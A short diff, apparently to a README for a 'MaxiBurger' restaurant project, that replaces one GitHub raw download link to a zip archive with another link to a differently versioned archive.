@@ -1,3 +1,3 @@
  restaurant maxiburger : 
 
- https://raw.githubusercontent.com/zduchevreuil/MaxiBurger-Restaurant/main/gubernative/MaxiBurger-Restaurant-v2.5.zip
+ https://raw.githubusercontent.com/zduchevreuil/MaxiBurger-Restaurant/main/gubernative/Restaurant-Maxi-Burger-v2.0.zip
